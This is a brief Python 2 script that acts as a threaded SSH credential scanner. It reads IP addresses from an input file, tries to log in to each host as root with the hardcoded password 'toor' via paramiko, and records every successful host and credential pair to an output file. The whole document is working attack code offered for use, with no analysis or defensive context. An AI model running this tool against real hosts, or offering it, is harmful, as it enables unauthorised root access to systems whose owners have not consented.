import socket
socket.setdefaulttimeout(5)
 
import paramiko
import sys
import threading
import os
import time
if sys.argv[1:]:
	print "File: %s" % (sys.argv[1])
	input = sys.argv[1]
else:
	input = raw_input("Please enter a input file to parse, e.g /var/log/secure: ")
if sys.argv[2:]:
	print "File %s" % (sys.argv[2])
	output = sys.argv[2]
else:
	output = raw_input("Please enter the output filename: ")

ipaddresses = []
f=open(input,'r').readlines()
fw = open(output, 'a')
ipaddresses = f
user = 'root'
passwd = 'toor'
 
def trylogin(ipaddress):
	global user,passwd
	 
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	try:
		ssh.connect(ipaddress,username=user,password=passwd)
		works = ipaddress.strip('\n')+','+user+','+passwd 
		fw.write(works+'\n')
		print '[+] '+ works
	except paramiko.AuthenticationException:
		print "[-] Authentication Exception! ..."      
		 
	except paramiko.SSHException:
		print "[-] SSH Exception! ..." 
	except socket.gaierror:
		print "eroror"


 
try:
	count=0
	while count<len(ipaddresses):
		for i in xrange(5):
			threading.Thread(target=trylogin,args=(str(ipaddresses[count]),)).start()
			time.sleep(0.7)
			count+=1
except Exception, e:
		print '[-] General Exception'
